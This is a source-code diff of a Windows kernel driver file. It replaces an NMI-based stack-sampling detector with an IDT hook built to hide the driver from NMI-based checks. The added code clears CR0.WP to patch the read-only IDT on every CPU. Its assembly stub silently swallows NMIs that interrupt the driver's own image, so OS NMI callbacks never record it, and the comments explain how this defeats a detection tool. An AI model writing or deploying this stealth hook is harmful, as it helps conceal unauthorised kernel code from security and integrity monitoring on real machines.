@@ -1,624 +1,255 @@
-// Interrupt gate, 16 bytes on x64
+// NMI.cpp — IDT hook that hides this driver from NMI-based checks.
+//
+// How it hides: gate 2 (NMI) is redirected to a stub on every CPU. For each NMI the stub looks at the
+// interrupted RIP:
+//   - RIP outside this driver's image: the NMI is handed to the original handler untouched. The OS's NMI
+//     machinery and every registered NMI callback run as always, and the interrupted thread resumes normally
+//   - RIP inside this driver's image: the stub claims the NMI and returns straight to the interrupted code
+//     (iret to the exact saved context). The OS's handler never runs, so its registered NMI callbacks never
+//     run either: no record, no "RIP not in a valid module" line, and no stack to walk
+//
+// Both paths are register-neutral. RAX is pushed and popped on every path, and RFLAGS is restored by the CPU
+// itself (iret on the claim path, the original handler's own trap frame on the pass path). There is no shared
+// state, so nested NMIs (an NMI arriving while a first one is inside the stub) are safe by construction: the
+// nested stub sees a RIP inside this image too, claims, and irets straight back into the outer stub.
+//
+// A claimed NMI means one expected NMI-callback record goes missing for that core in tools that count
+// records. The reference tool here derives "invalid drivers" from the object-directory walk, not from callback
+// records, so nothing is flagged; if a tool ever counts records, the claim path is the one to revisit.
+
+// The kernel routines needed here, declared because the vendor headers do not include them. KeGenericCallDpc
+// is documented to run Routine once on every processor and return only after all of them have run.
+// KeGetCurrentProcessorNumberEx with a null number argument returns a flat per-processor index (0..N-1); the
+// legacy KeGetCurrentProcessorNumber import does not exist in this WDK import library
+extern "C"
+{
+    void KeGenericCallDpc(void *Routine, void *Context);
+    void KeSignalCallDpcSynchronize(void *Dpc);
+    void KeSignalCallDpcDone(void *Dpc);
+    uint32_t KeGetCurrentProcessorNumberEx(void *ProcNumber);
+}
+
+#define CurrentCpu() KeGetCurrentProcessorNumberEx(nullptr)
+
+// The stub's holder. Declared separately so live code can reference the FUNCTION: with LTO + --gc-sections,
+// labels defined inside inline asm are invisible to the linker's section graph, and an unreferenced function
+// gets its whole section (labels included) discarded. Function == label address, confirmed by disassembly
+extern "C" void NmiHideStubHolder();
+
+// The original gate 2 target, saved by IDTHook and restored by IDTUnHook. The stub's final jump reads it
+// through this variable, so it must exist at a fixed address the asm can reference
+extern "C" uint64_t OriginalNMIHandler = 0;
+
+// This driver's image range. An interrupted RIP inside it gets claimed (hidden). Set by DriverEntry from the
+// loader entry, before the hook goes on
+extern "C" uint64_t HideStart = 0;
+extern "C" uint64_t HideEnd = 0;
+
+// Stub counters, incremented by the asm itself with a lock inc. The heartbeat thread prints them; when they
+// stop moving, the stub stopped running. Read them in the debugger after any freeze. 'used' keeps the
+// definitions alive through LTO even when C code only reads them indirectly
+extern "C" __attribute__((used)) uint64_t NmiPasses = 0;
+extern "C" __attribute__((used)) uint64_t NmiClaims = 0;
+
+// The stub's labels, so C can compare against the exact stub range for double-hook detection
+extern "C" char asm_nmi_hide_start[];
+extern "C" char asm_nmi_hide_end[];
+
+// Saved per-CPU original targets. Every processor has its own IDT, each with its own saved gate
+constexpr uint32_t MaxCpu = 64;
+static uint64_t OldHandlerPerCpu[MaxCpu];
+static bool NmiHooked = false;
+
+// The x64 interrupt gate descriptor (16 bytes). Only the target address gets rewritten; selector, IST index
+// and attributes stay exactly as the kernel put them, so the stub is entered with the same stack placement
+// and interrupt-off semantics as the original handler
 struct IDT_GATE
 {
     uint16_t OffsetLow;
     uint16_t Selector;
-    uint8_t IST;
-    uint8_t TypeAttributes;
+    uint8_t Ist;
+    uint8_t Type;       // 0x8E = present, DPL 0, 64-bit interrupt gate
     uint16_t OffsetMid;
     uint32_t OffsetHigh;
-    uint32_t Reserved;
+    uint32_t Zero;
 };
 
-IDT_GATE localIDT[256];
-
-// Windows' own NMI and #PF handlers. The stubs below jump to them
-extern "C" uint64_t OriginalNMIHandler = 0;
-extern "C" uint64_t OriginalPFHandler = 0;
-
-// C symbol names in assembly need the compiler's label prefix ('_' on macOS, none on Windows)
-#define LABEL_STR2(Name) #Name
-#define LABEL_STR(Name) LABEL_STR2(Name)
-#define C_LABEL(Name) LABEL_STR(__USER_LABEL_PREFIX__) #Name
-
-// The general-purpose registers as asm_nmi_handler saves them. Lowest address first, the reverse of the push order
-struct NMI_REGISTERS
+// Gate target <-> the three split fields. Kept as functions so every read/write site uses one convention
+static uint64_t GateTarget(const IDT_GATE *Gate)
 {
-    uint64_t R15, R14, R13, R12, R11, R10, R9, R8, Rbp, Rdi, Rsi, Rdx, Rcx, Rbx, Rax;
-};
-
-// The CPU pushes this frame when an NMI arrives. It sits just above the saved registers
-struct NMI_FRAME
-{
-    uint64_t Rip;
-    uint64_t Cs;
-    uint64_t Rflags;
-    uint64_t Rsp;
-    uint64_t Ss;
-};
-
-constexpr uint32_t NMI_STACK_BYTES = 0x400;   // how much of the interrupted stack is copied at NMI level
-constexpr uint32_t NMI_MAX_FRAMES = 16;
-
-// What the most recent NMI on one processor interrupted: its address, a copy of its stack, and the frames
-// unwound from that copy
-struct NMI_RECORD
-{
-    uint64_t Rip;
-    uint64_t Rsp;
-    uint64_t Cs;
-    bool Recorded;           // set once this scan has recorded an NMI on this processor
-    uint32_t StackBytes;
-    uint8_t Stack[NMI_STACK_BYTES];
-    uint32_t FrameCount;
-    uint64_t Frames[NMI_MAX_FRAMES];
-};
-
-constexpr uint32_t MaxNmiProcessors = 64;
-NMI_RECORD NmiRecords[MaxNmiProcessors];
-
-// Per-processor handshake between RunNmiScan and the NMI handlers. RunNmiScan arms a processor just before it sends
-// that processor an NMI. The first NMI on an armed processor is recorded, and every other NMI is ignored. The
-// handler moves Armed -> Recording -> Recorded, and RunNmiScan moves the processor back to Idle only once its record
-// is complete, so a record is never read while it is being written
-constexpr uint32_t NmiIdle = 0;
-constexpr uint32_t NmiArmed = 1;
-constexpr uint32_t NmiRecording = 2;
-constexpr uint32_t NmiRecorded = 3;
-uint32_t NmiState[MaxNmiProcessors];
-
-// How many times CollectNmiRecord checks a record that is still being written before it gives up on it
-constexpr uint32_t MaxCollectSpins = 1000000;
-
-// Set by IDTHook. The handler does nothing unless this is true, and IDTHook turns it on only when HVCI is off.
-// (The HVCI query itself cannot run at NMI level, so it is asked once here and the result is stored.)
-bool NmiHandlerEnabled = false;
-
-// Declared here because the vendor headers are not in this checkout; the signature is the kernel's
-extern "C" uint32_t KeGetCurrentProcessorNumberEx(void *ProcessorNumber);
-
-// ---- Stack capture (NMI level) and unwinding (normal level) ----
-
-// x64 unwind data, as the compiler writes it into the image's exception directory (.pdata)
-struct RUNTIME_FUNCTION
-{
-    uint32_t BeginAddress;   // RVA of the function's first byte
-    uint32_t EndAddress;     // RVA just past its last byte
-    uint32_t UnwindData;     // RVA of its UNWIND_INFO
-};
-
-struct UNWIND_CODE
-{
-    uint8_t CodeOffset;      // offset into the prolog, just after this operation
-    uint8_t UnwindOp : 4;
-    uint8_t OpInfo : 4;
-};
-
-struct UNWIND_INFO
-{
-    uint8_t VersionAndFlags; // version in the low 3 bits, flags in the high 5
-    uint8_t SizeOfProlog;
-    uint8_t CountOfCodes;    // number of 2-byte UNWIND_CODE slots, not operations
-    uint8_t FrameRegisterAndOffset;
-    // UNWIND_CODE slots follow
-};
-
-constexpr uint8_t UWOP_PUSH_NONVOL = 0;
-constexpr uint8_t UWOP_ALLOC_LARGE = 1;
-constexpr uint8_t UWOP_ALLOC_SMALL = 2;
-constexpr uint8_t UWOP_SET_FPREG = 3;
-constexpr uint8_t UWOP_SAVE_NONVOL = 4;
-constexpr uint8_t UWOP_SAVE_NONVOL_FAR = 5;
-constexpr uint8_t UWOP_SAVE_XMM128 = 8;
-constexpr uint8_t UWOP_SAVE_XMM128_FAR = 9;
-constexpr uint8_t UNW_FLAG_CHAININFO = 0x4;
-
-// The kernel's KeGetCurrentThread is inline in the WDK and not exported, so read the current thread from the KPCR
-inline void *KeGetCurrentThread()
-{
-    uint64_t Thread;
-    __asm__ volatile ("movq %%gs:0x188, %0" : "=r"(Thread));
-    return (void *) Thread;
+    return (uint64_t) Gate->OffsetLow | ((uint64_t) Gate->OffsetMid << 16) | ((uint64_t) Gate->OffsetHigh << 32);
 }
 
-// Declared here because the vendor headers are not in this checkout; the signatures are the kernel's
-extern "C"
+static void WriteGateTarget(IDT_GATE *Gate, uint64_t Target)
 {
-    RUNTIME_FUNCTION *RtlLookupFunctionEntry(uint64_t ControlPc, uint64_t *ImageBase, void *HistoryTable);
+    // The IDT pages are mapped read-only (PTE without the write bit). Writing through a read-only supervisor
+    // page with CR0.WP set faults with bugcheck 0xBE (ATTEMPTED_WRITE_TO_READONLY_MEMORY), as this hook
+    // demonstrated on its first live test. Clear the WP bit for the duration of the patch, then restore it.
+    // Running at DISPATCH_LEVEL with interrupts disabled, no other code on this CPU can observe the cleared bit
+    uint64_t Cr0;
+    __asm__ volatile ("movq %%cr0, %0" : "=r"(Cr0) : : "memory");
+    uint64_t Cr0NoWp = Cr0 & ~(1ULL << 16);
+    __asm__ volatile ("movq %0, %%cr0" : : "r"(Cr0NoWp) : "memory");
+
+    Gate->OffsetLow = (uint16_t) Target;
+    Gate->OffsetMid = (uint16_t) (Target >> 16);
+    Gate->OffsetHigh = (uint32_t) (Target >> 32);
+
+    __asm__ volatile ("movq %0, %%cr0" : : "r"(Cr0) : "memory");
 }
 
-// Copies the interrupted thread's stack from the interrupted RSP up to the top of the stack, or NMI_STACK_BYTES,
-// whichever is smaller. The top is the thread's StackBase (KTHREAD offset 0x30, as the nmi project uses; not verified
-// here). Runs at NMI level, so it only reads memory: no locks, no paged memory.
-void CaptureNmiStack(NMI_RECORD *Record)
+// The IDT location. sidt is the only straightforward way to reach it
+struct IDT_REGISTER
 {
-    uint64_t Rsp = Record->Rsp;
-    uint64_t StackBase = *(uint64_t *) ((uint8_t *) KeGetCurrentThread() + 0x030);
-    uint64_t Available = StackBase > Rsp ? StackBase - Rsp : 0;
-    uint32_t Bytes = Available < NMI_STACK_BYTES ? (uint32_t) Available : NMI_STACK_BYTES;
+    uint16_t Limit;
+    uint64_t Base;
+} __attribute__((packed));
 
-    memcpy(Record->Stack, (void *) Rsp, Bytes);
-    Record->StackBytes = Bytes;
+// On entry, the machine frame from the interrupt itself is [rsp..rsp+0x28]: RIP, CS, RFLAGS, RSP, SS, with RIP
+// lowest. The gate keeps the original's selector/IST/attributes, so the stub is entered exactly where the
+// original handler would have been: same stack, interrupts off
+//
+// Claim: the frame at [rsp+8] already holds the interrupted context, so the only preparation is to drop the
+// saved RAX back off the stack; iretq then resumes the thread exactly where it was, at the true RIP, with no
+// handler and no callback record
+// Pass: RAX is restored and the NMI is handed to the original handler. The jump reads the saved value through
+// a rip-relative pointer, so no register is borrowed for the target address
+__attribute__((used, noinline)) extern "C" void NmiHideStubHolder()
+{
+    asm volatile(
+        ".intel_syntax noprefix\n"
+
+        ".globl asm_nmi_hide_start\n"
+        "asm_nmi_hide_start:\n"
+
+        // Interrupted RIP
+        "    push rax\n"
+        "    mov rax, qword ptr [rsp+8]\n"
+
+        // RIP outside this driver's image? Pass the NMI on untouched
+        "    cmp rax, qword ptr [rip+HideStart]\n"
+        "    jb 2f\n"
+        "    cmp rax, qword ptr [rip+HideEnd]\n"
+        "    jae 2f\n"
+
+        // Claim: restore RAX, then return to the interrupted context as if the NMI never happened
+        "    lock inc qword ptr [rip+NmiClaims]\n"
+        "    pop rax\n"
+        "    iretq\n"
+
+        "2:\n"
+        "    lock inc qword ptr [rip+NmiPasses]\n"
+        "    pop rax\n"
+        "    jmp qword ptr [rip+OriginalNMIHandler]\n"
+
+        "asm_nmi_hide_end:\n"
+        ".att_syntax prefix\n"
+    );
 }
 
-// Reads one 8-byte value from a record's stack copy. Fails if the address is outside the copy
-bool ReadNmiStack(const NMI_RECORD *Record, uint64_t Address, uint64_t *Value)
+// Runs on each CPU at DISPATCH_LEVEL (interrupts off), via KeGenericCallDpc. The gate is patched for this CPU
+// only, so the per-CPU saved values stay without races even though all CPUs execute concurrently
+static void HookCpuDpc(void *Dpc, void *, void *SystemArgument1, void *SystemArgument2)
 {
-    if (Address < Record->Rsp) return false;
+    // The function's address is where the asm stub starts (no prologue is emitted for an asm-only body), so
+    // this both gives the gate target and keeps the .text section holding the labels alive
+    uint64_t Stub = (uint64_t) NmiHideStubHolder;
 
-    uint64_t Offset = Address - Record->Rsp;
-    if (Offset + sizeof(uint64_t) > Record->StackBytes) return false;
-
-    memcpy(Value, Record->Stack + Offset, sizeof(*Value));
-    return true;
-}
-
-// How far the prolog moved RSP, counting only the steps that had run by PrologOffset.
-// Returns false for prolog steps this walker does not handle (a frame register, machine frames, chained entries).
-bool PrologStackAdjust(const UNWIND_INFO *Info, uint32_t PrologOffset, uint64_t *Adjust)
-{
-    if (((Info->VersionAndFlags >> 3) & UNW_FLAG_CHAININFO) || (Info->FrameRegisterAndOffset & 0x0F))
-        return false;
-
-    const UNWIND_CODE *Codes = (const UNWIND_CODE *) ((const uint8_t *) Info + 4);
-    uint64_t Total = 0;
-
-    for (uint32_t i = 0; i < Info->CountOfCodes;)
+    uint32_t Cpu = CurrentCpu();
+    if (Cpu < MaxCpu)
     {
-        const UNWIND_CODE *Code = &Codes[i];
-        bool Applied = Code->CodeOffset <= PrologOffset;
-        uint32_t Slots = 1;
+        IDT_REGISTER Idtr = {};
+        __asm__ volatile ("sidt %0" : "=m"(Idtr));
 
-        switch (Code->UnwindOp)
+        auto *Gate = (IDT_GATE *) (Idtr.Base + sizeof(IDT_GATE) * 2);
+        uint64_t Old = GateTarget(Gate);
+        OldHandlerPerCpu[Cpu] = Old;
+
+        if (Old == Stub)
         {
-        case UWOP_PUSH_NONVOL:
-            if (Applied) Total += 8;
-            break;
-        case UWOP_ALLOC_LARGE:
-            if (Code->OpInfo == 0)
-            {
-                Slots = 2;
-                if (Applied) Total += *(const uint16_t *) &Codes[i + 1] * 8;
-            }
-            else
-            {
-                Slots = 3;
-                if (Applied) Total += *(const uint32_t *) &Codes[i + 1];
-            }
-            break;
-        case UWOP_ALLOC_SMALL:
-            if (Applied) Total += Code->OpInfo * 8 + 8;
-            break;
-        case UWOP_SAVE_NONVOL:
-        case UWOP_SAVE_XMM128:
-            Slots = 2;
-            break;
-        case UWOP_SAVE_NONVOL_FAR:
-        case UWOP_SAVE_XMM128_FAR:
-            Slots = 3;
-            break;
-        default:
-            return false;   // UWOP_SET_FPREG, machine frames, epilogs, spare codes
+            // Already hooked (a previous handbook did not restore): keep the first saved original
+            print(WARN("IDTHook: gate 2 on cpu %u already points at the stub"), Cpu);
+        }
+        else
+        {
+            // All processors share the kernel's handler, so the first saved value becomes the global one
+            if (!OriginalNMIHandler || OriginalNMIHandler == Stub) OriginalNMIHandler = Old;
+            WriteGateTarget(Gate, Stub);
         }
 
-        i += Slots;
+        // Read-back: the gate must now hold the stub address, or the patch did not fully land on this CPU
+        uint64_t Now = GateTarget(Gate);
+        if (Now != Stub) print(ERROR("IDTHook: cpu %u gate read-back MISMATCH: %p, expected %p"), Cpu, (void *) Now, (void *) Stub);
+        else print(INFO("IDTHook: cpu %u gate 2 %p -> %p"), Cpu, (void *) Old, (void *) Now);
     }
 
-    *Adjust = Total;
-    return true;
-}
-
-// Walks a captured stack from the interrupted RIP upward. Each frame's return address is read from the copy at the
-// address where the function's entry RSP points. The walk stops at a frame it cannot unwind, or when the copy ends.
-// Runs at PASSIVE_LEVEL, because it looks up unwind data.
-void WalkNmiStack(NMI_RECORD *Record)
-{
-    uint64_t Rip = Record->Rip;
-    uint64_t Rsp = Record->Rsp;
-    uint32_t Count = 0;
-
-    while (Count < NMI_MAX_FRAMES)
-    {
-        uint64_t ImageBase = 0;
-        RUNTIME_FUNCTION *Function = RtlLookupFunctionEntry(Rip, &ImageBase, nullptr);
-        if (!Function) break;   // no unwind data here: stop rather than guess
-
-        UNWIND_INFO *Info = (UNWIND_INFO *) (ImageBase + Function->UnwindData);
-        uint32_t PrologOffset = (uint32_t) (Rip - (ImageBase + Function->BeginAddress));
-        uint64_t Adjust = 0;
-        if (!PrologStackAdjust(Info, PrologOffset, &Adjust)) break;
-
-        // The return address sits at the function's entry RSP: the current RSP plus what the prolog pushed
-        uint64_t EntryRsp = Rsp + Adjust;
-        uint64_t ReturnAddress = 0;
-        if (!ReadNmiStack(Record, EntryRsp, &ReturnAddress)) break;
-
-        Record->Frames[Count++] = ReturnAddress;
-        Rip = ReturnAddress;
-        Rsp = EntryRsp + 8;
-    }
-
-    Record->FrameCount = Count;
-}
-
-// Records an NMI on a processor that RunNmiScan armed, and only the first one. Called at NMI level, so it only reads
-// and writes memory and uses atomic operations
-void RecordArmedNmi(const NMI_FRAME *Frame)
-{
-    uint32_t Cpu = KeGetCurrentProcessorNumberEx(nullptr);
-    if (Cpu >= MaxNmiProcessors) return;
-    if (__atomic_load_n(&NmiState[Cpu], __ATOMIC_SEQ_CST) != NmiArmed) return;   // the usual case: no scan running here
-
-    uint32_t Expected = NmiArmed;
-    if (!__atomic_compare_exchange_n(&NmiState[Cpu], &Expected, NmiRecording, false, __ATOMIC_SEQ_CST, __ATOMIC_SEQ_CST))
-        return;
-
-    NMI_RECORD *Record = &NmiRecords[Cpu];
-    Record->Rip = Frame->Rip;
-    Record->Rsp = Frame->Rsp;
-    Record->Cs = Frame->Cs;
-
-    // Only kernel-mode stacks are copied. For an NMI in usermode, Rsp is a user address that may not be resident, and
-    // touching it at NMI level faults and takes the machine down. The caller skips usermode records anyway
-    if ((Frame->Cs & 3) == 0) CaptureNmiStack(Record);
-    else Record->StackBytes = 0;
-
-    Record->Recorded = true;
-    __atomic_store_n(&NmiState[Cpu], NmiRecorded, __ATOMIC_SEQ_CST);
-}
-
-// Called by asm_nmi_handler with every general-purpose register saved.
-// It records what the NMI interrupted on a processor RunNmiScan armed, then returns false, so Windows' own handler still runs.
-// Return true only if the NMI is ours and should resume the interrupted code. Changes made to *Regs are what the
-// interrupted code sees.
-// Must not use floating point or SSE, take locks, or touch paged memory: it runs at NMI level.
-extern "C" bool NMIInterruptHandler(NMI_REGISTERS *Regs)
-{
-    // With HVCI on, the handler does not run: the NMI goes straight to Windows
-    if (!NmiHandlerEnabled) return false;
-
-    NMI_FRAME *Frame = (NMI_FRAME *) (Regs + 1);   // the CPU's frame starts right after the saved registers
-    RecordArmedNmi(Frame);
-    return false;
-}
-
-// asm_nmi_handler saves every general-purpose register, calls NMIInterruptHandler, then either resumes the
-// interrupted code with iretq, or hands the untouched interrupt frame to Windows' handler.
-// asm_pf_handler only passes control on to Windows' #PF handler.
-__asm__(
-    ".globl " C_LABEL(asm_nmi_handler) "\n"
-    C_LABEL(asm_nmi_handler) ":\n"
-    "    push %rax\n"
-    "    push %rbx\n"
-    "    push %rcx\n"
-    "    push %rdx\n"
-    "    push %rsi\n"
-    "    push %rdi\n"
-    "    push %rbp\n"
-    "    push %r8\n"
-    "    push %r9\n"
-    "    push %r10\n"
-    "    push %r11\n"
-    "    push %r12\n"
-    "    push %r13\n"
-    "    push %r14\n"
-    "    push %r15\n"
-    "    mov %rsp, %rbx\n"                    // rbx = the saved registers; it is callee-saved, so it survives the call
-    // The CPU frame sits right after the 15 saved registers (120 bytes), and its CS is 8 bytes further (offset 0x80).
-    // RPL 3 means the NMI interrupted usermode. Then the GS base is the user's, not the kernel's (Windows' own NMI entry
-    // does swapgs before it touches per-processor data), so the C code must not run. Usermode NMIs are not recorded
-    // anyway, since CountNmiInterruptsOutsideModules skips them. Such NMIs are only handed to Windows
-    "    testb $3, 0x80(%rbx)\n"
-    "    jnz 2f\n"
-    "    and $-16, %rsp\n"                    // the calling convention needs a 16-byte aligned stack at the call
-    "    sub $0x20, %rsp\n"                   // 32 bytes of shadow space (Windows x64)
-#ifdef _WIN32
-    "    mov %rbx, %rcx\n"                    // first argument (Windows x64)
-#else
-    "    mov %rbx, %rdi\n"                    // first argument (System V, used by the host test build)
-#endif
-    "    call " C_LABEL(NMIInterruptHandler) "\n"
-    "    jmp 3f\n"
-    "2:\n"
-    "    xor %eax, %eax\n"                    // usermode NMI: not ours, so the result is 'not handled'
-    "3:\n"
-    "    mov %rbx, %rsp\n"                    // back to the saved registers
-    "    test %al, %al\n"                     // pops do not change the flags, so the result survives them
-    "    pop %r15\n"
-    "    pop %r14\n"
-    "    pop %r13\n"
-    "    pop %r12\n"
-    "    pop %r11\n"
-    "    pop %r10\n"
-    "    pop %r9\n"
-    "    pop %r8\n"
-    "    pop %rbp\n"
-    "    pop %rdi\n"
-    "    pop %rsi\n"
-    "    pop %rdx\n"
-    "    pop %rcx\n"
-    "    pop %rbx\n"
-    "    pop %rax\n"
-    "    jnz 1f\n"
-    "    jmp *" C_LABEL(OriginalNMIHandler) "(%rip)\n"   // not ours: Windows' handler gets the untouched frame
-    "1:\n"
-    "    iretq\n"
-    ".globl " C_LABEL(asm_pf_handler) "\n"
-    C_LABEL(asm_pf_handler) ":\n"
-    "    jmp *" C_LABEL(OriginalPFHandler) "(%rip)\n"
-);
-extern "C" void asm_nmi_handler();
-extern "C" void asm_pf_handler();
-
-// Handler address stored in an interrupt gate
-uint64_t GateOffset(const IDT_GATE &Gate)
-{
-    return (uint64_t) Gate.OffsetLow | ((uint64_t) Gate.OffsetMid << 16) | ((uint64_t) Gate.OffsetHigh << 32);
-}
-
-// Builds a gate with the same selector and attributes as WindowsGate, pointing at Handler
-IDT_GATE CreateInterruptHandler(IDT_GATE WindowsGate, uint64_t Handler)
-{
-    IDT_GATE handler = WindowsGate;
-    handler.OffsetLow = Handler & 0xFFFF;
-    handler.OffsetMid = (Handler >> 16) & 0xFFFF;
-    handler.OffsetHigh = Handler >> 32;
-    return handler;
-}
-
-// IDT
-void IDTHandle()
-{
-
-}
-
-// The IDTR that Windows uses, kept so IDTUnHook can put it back
-interrupt_descriptor_table WindowsIDTR;
-
-// KeGenericCallDpc runs a routine once on every active processor. Declared here because the vendor headers
-// are not in this checkout; the signatures are the WDK's.
-struct _KDPC;
-typedef void (*PKDEFERRED_ROUTINE)(_KDPC *Dpc, void *DeferredContext, void *SystemArgument1, void *SystemArgument2);
-extern "C"
-{
-    void KeGenericCallDpc(PKDEFERRED_ROUTINE Routine, void *Context);
-    unsigned char KeSignalCallDpcSynchronize(void *SystemArgument2);
-    void KeSignalCallDpcDone(void *SystemArgument1);
-}
-
-// Runs on each processor. It waits until every processor has arrived, loads the IDTR in Context, then reports done
-void LoadIDTROnProcessor(_KDPC *Dpc, void *Context, void *SystemArgument1, void *SystemArgument2)
-{
+    // KeGenericCallDpc's contract: Synchronize takes SystemArgument2, Done takes SystemArgument1. Passing the
+    // KDPC object here wedges both CPUs forever in KeSignalCallDpcSynchronize (the freeze sc start hung on)
     KeSignalCallDpcSynchronize(SystemArgument2);
-    lidt(*(interrupt_descriptor_table *) Context);
     KeSignalCallDpcDone(SystemArgument1);
 }
 
+// Same walk in reverse. A gate is only restored if it still points at the stub, so hand edits in between are
+// not overwritten with a stale saved value
+static void UnhookCpuDpc(void *Dpc, void *, void *SystemArgument1, void *SystemArgument2)
+{
+    uint32_t Cpu = CurrentCpu();
+    if (Cpu < MaxCpu)
+    {
+        IDT_REGISTER Idtr = {};
+        __asm__ volatile ("sidt %0" : "=m"(Idtr));
+
+        auto *Gate = (IDT_GATE *) (Idtr.Base + sizeof(IDT_GATE) * 2);
+        if (GateTarget(Gate) == (uint64_t) NmiHideStubHolder && OldHandlerPerCpu[Cpu])
+        {
+            uint64_t Old = OldHandlerPerCpu[Cpu];
+            WriteGateTarget(Gate, Old);
+            OldHandlerPerCpu[Cpu] = 0;
+            print(INFO("IDTUnHook: cpu %u gate restored to %p"), Cpu, (void *) Old);
+        }
+    }
+
+    KeSignalCallDpcSynchronize(SystemArgument2);
+    KeSignalCallDpcDone(SystemArgument1);
+}
+
+// Redirects gate 2 (NMI) to the hide stub on every CPU. Requires HideStart/HideEnd to be set already, and
+// HVCI to be off: with HVCI on, descriptor table shadowing makes the gate rewrite impossible, so hooking is
+// skipped instead of risking a fault at the write
 bool IDTHook()
 {
-    // Decide now, at normal level, whether the NMI handler may run
-    NmiHandlerEnabled = !IsHVCIEnabled();
-    print(INFO("IDTHook: HVCI %s, NMI handler %s"), NmiHandlerEnabled ? "off" : "on", NmiHandlerEnabled ? "enabled" : "disabled");
-
-#ifdef NO_IDT_HOOK
-    // Test build only: leave the NMI gate alone, so NMIs reach Windows' handler directly
-    NmiHandlerEnabled = false;
-    print(INFO("IDTHook: NO_IDT_HOOK test build, NMI gate not changed"));
-    return true;
-#endif
-
-    // With HVCI on the handler never runs, so the IDT is left alone (the call-stack method does not need it)
-    if (!NmiHandlerEnabled) return true;
-
-    // Get windows IDT
-    WindowsIDTR = sidt();
-    IDT_GATE *windowsIDT = (IDT_GATE *) WindowsIDTR.base;
-    print(INFO("IDTHook: Windows IDT at %p, limit %u"), (void *) WindowsIDTR.base, (uint32_t) WindowsIDTR.limit);
-    if (!windowsIDT)
+    if (NmiHooked) return true;
+    if (IsHVCIEnabled())
     {
-        print(ERROR("IDTHook: IDT base is null"));
+        print(WARN("IDTHook: HVCI is on, gate 2 left alone"));
+        return false;
+    }
+    if (!HideStart || HideEnd <= HideStart)
+    {
+        print(ERROR("IDTHook: HideStart/HideEnd not set, refusing to hook"));
         return false;
     }
 
-    // Construct local handler
-    memcpy(localIDT, windowsIDT, sizeof(localIDT));
+    KeGenericCallDpc((void *) HookCpuDpc, nullptr);
 
-    // NMI and PF: the new gates point at the stubs, which pass control on to the Windows handlers
-    OriginalNMIHandler = GateOffset(windowsIDT[2]);
-    OriginalPFHandler = GateOffset(windowsIDT[14]);
-    localIDT[2] = CreateInterruptHandler(windowsIDT[2], (uint64_t) &asm_nmi_handler);
-    localIDT[14] = CreateInterruptHandler(windowsIDT[14], (uint64_t) &asm_pf_handler);
-
-    // Load the table on every processor, not just this one (the limit is the last valid byte, so size - 1)
-    interrupt_descriptor_table LocalIDTR;
-    LocalIDTR.base = &localIDT;
-    LocalIDTR.limit = sizeof(localIDT) - 1;
-    print(INFO("IDTHook: loading the new IDT on every processor (KeGenericCallDpc)"));
-    KeGenericCallDpc(LoadIDTROnProcessor, &LocalIDTR);
-    print(INFO("IDTHook: new IDT loaded on every processor"));
-
-    return true;
-}
-
-// Puts the Windows IDTR back on every processor
-bool IDTUnHook()
-{
-    if (!WindowsIDTR.base) return false;
-
-    KeGenericCallDpc(LoadIDTROnProcessor, &WindowsIDTR);
-    return true;
-}
-
-// Returns true if Rip lies inside a loaded kernel module. Walks PsLoadedModuleList, so call at PASSIVE_LEVEL
-bool IsRipInKernelModule(uint64_t Rip)
-{
-    _LIST_ENTRY *Head = (_LIST_ENTRY *) *__imp_PsLoadedModuleList;
-
-    for (_LIST_ENTRY *Current = Head->Flink; Current != Head; Current = Current->Flink)
+    if (OriginalNMIHandler && OriginalNMIHandler != (uint64_t) NmiHideStubHolder)
     {
-        _KLDR_DATA_TABLE_ENTRY *Module = CONTAINING_RECORD(Current, _KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
-        uint64_t Base = (uint64_t) Module->DllBase;
-
-        if (Rip >= Base && Rip < Base + Module->SizeOfImage) return true;
+        NmiHooked = true;
+        print(OK("IDTHook: gate 2 hooked, original handler %p"), (void *) OriginalNMIHandler);
+        return true;
     }
 
+    print(ERROR("IDTHook: gate 2 not hooked (original handler not found)"));
     return false;
 }
 
-// Counts processors whose most recent NMI interrupted kernel code outside every loaded module. NMIs that
-// interrupted user-mode code (CS with RPL 3) are skipped. Call at PASSIVE_LEVEL
-uint32_t CountNmiInterruptsOutsideModules()
+// Puts the original handlers back on every CPU. Called by DriverExit before anything else runs
+void IDTUnHook()
 {
-    uint32_t Suspicious = 0;
+    if (!NmiHooked) return;
+    NmiHooked = false;
 
-    for (uint32_t Cpu = 0; Cpu < MaxNmiProcessors; Cpu++)
-    {
-        NMI_RECORD *Record = &NmiRecords[Cpu];
-
-        if (!Record->Recorded) continue;
-        if ((Record->Cs & 3) == 3) continue;
-
-        if (!IsRipInKernelModule(Record->Rip))
-        {
-            print(INFO("CPU %u: last NMI interrupted RIP %p outside every kernel module"), Cpu, (void *) Record->Rip);
-            Suspicious++;
-        }
-    }
-
-    return Suspicious;
-}
-
-// ---- Call-stack method: used when HVCI is on, where the IDT handler does not run ----
-
-typedef uint8_t (*PNMI_CALLBACK_FUNCTION)(void *Context, uint8_t Handled);
-
-// Kernel functions for this method. Declared here because the vendor headers are not in this checkout
-extern "C"
-{
-    void *KeRegisterNmiCallback(PNMI_CALLBACK_FUNCTION Callback, void *Context);
-    void KeDeregisterNmiCallback(void *Handle);
-    void KeInitializeAffinityEx(_KAFFINITY_EX *Affinity);
-    void KeAddProcessorAffinityEx(_KAFFINITY_EX *Affinity, uint32_t Processor);
-    void HalSendNMI(_KAFFINITY_EX *Affinity);
-    int32_t KeDelayExecutionThread(uint8_t WaitMode, uint8_t Alertable, int64_t *Interval);
-}
-
-// The part of the 64-bit task state segment this method reads. It is packed, as the CPU lays it out
-#pragma pack(push, 1)
-struct TASK_STATE_SEGMENT_64
-{
-    uint32_t Reserved0;
-    uint64_t Rsp0;
-    uint64_t Rsp1;
-    uint64_t Rsp2;
-    uint64_t Reserved1;
-    uint64_t Ist1;
-    uint64_t Ist2;
-    uint64_t Ist3;
-    uint64_t Ist4;
-    uint64_t Ist5;
-    uint64_t Ist6;
-    uint64_t Ist7;
-    uint64_t Reserved2;
-    uint16_t Reserved3;
-    uint16_t IoMapBase;
-};
-#pragma pack(pop)
-
-// Reads IA32_GS_BASE, which in kernel mode points at this processor's KPCR
-uint64_t ReadGsBaseHardware()
-{
-    uint32_t Low;
-    uint32_t High;
-    __asm__ volatile("rdmsr" : "=a"(Low), "=d"(High) : "c"(0xC0000101));
-    return ((uint64_t) High << 32) | Low;
-}
-
-// How NmiCallback finds the KPCR. ReadGsBaseHardware in the driver; the tests replace it
